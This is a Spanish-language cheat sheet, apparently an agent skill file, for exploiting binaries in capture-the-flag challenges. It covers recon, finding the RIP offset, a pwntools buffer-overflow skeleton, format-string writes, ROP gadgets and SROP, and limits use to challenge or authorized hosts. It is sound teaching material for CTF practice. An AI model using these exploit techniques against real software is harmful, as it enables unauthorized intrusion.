# Pwn — explotación de binarios

## Reconocimiento

```bash
file ./bin
checksec --file=./bin
readelf -hW ./bin | grep -E 'Type|Machine'
readelf -lW ./bin | grep -i stack      # NX / ejecutable
readelf -sW ./bin | head -40
strings -n 6 ./bin | grep -Ei 'flag|pass|win|sh'
```

## ¿Dónde está la función interesante?

```bash
objdump -d -Mintel ./bin | grep -A20 '<win>'
nm -C ./bin | grep -i ' t '
python ../skills/reversing-obfuscated-binaries-and-vms/scripts/find_main.py ./bin
```

## Offset hasta RIP

```bash
# patrón cíclico
python3 -c "import sys;sys.stdout.buffer.write(b'A'*200)" | ./bin
gdb -q ./bin -ex 'run < <(python3 -c "print(\"A\"*200)")' -ex 'info registers rip'
python ../skills/exploiting-binary-vulnerabilities-in-ctf/scripts/offset_finder.py ./bin
```

## pwntools — esqueleto

```python
from pwn import *
context.binary = elf = ELF('./bin')
context.log_level = 'info'
io = process('./bin')          # o remote('<host>', <puerto>)
rop = ROP(elf)

payload  = b'A' * offset
payload += p64(elf.symbols['win'])
io.sendline(payload)
io.interactive()
```

## Format string

```bash
# Localizar el offset del stack con %p
python ../skills/exploiting-binary-vulnerabilities-in-ctf/scripts/fmtstr_write.py --probe ./bin
```

Reglas:
- `%n` escribe 4 bytes, `%hn` escribe 2.
- Direcciones en la pila → revisar el orden de los argumentos.
- Escribir de menor a mayor valor para no desbordar el contador.

## Gadgets y libc

```bash
ROPgadget --binary ./bin | grep -E 'pop rdi|pop rsi|ret$'
one_gadget ./libc.so.6
pwn libcdb libc.so.6              # o https://libc.rip
```

## SROP / ret2dlresolve

```bash
python ../skills/exploiting-binary-vulnerabilities-in-ctf/scripts/srop_execve.py ./bin --offset <n>
```

## Validación local antes del remoto

Siempre: crear `/tmp/flag` de prueba, ejecutar el exploit local, confirmar lectura,
y recién entonces apuntar al host. Registrar el resultado local en el writeup.

## Guardrails

- Solo contra binarios del reto o hosts autorizados.
- Nada de ataques de agotamiento de recursos.
- Guardar el exploit en `solucion\` con comentarios de cada offset.
